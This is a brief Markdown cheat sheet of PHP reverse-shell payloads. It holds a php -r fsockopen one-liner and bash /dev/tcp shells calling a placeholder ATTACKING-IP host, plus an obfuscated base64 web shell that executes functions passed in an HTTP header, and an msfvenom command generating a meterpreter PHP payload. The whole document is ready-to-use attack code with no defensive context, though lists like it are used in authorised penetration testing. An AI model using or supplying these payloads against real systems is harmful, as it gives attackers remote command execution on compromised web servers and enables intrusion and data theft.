### Basic PHP Shell
```
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### PHP One liners
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```
#### Another one
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
```
#### Base64 PHP Shell
```
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

#### Msfvenom 
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.php
```



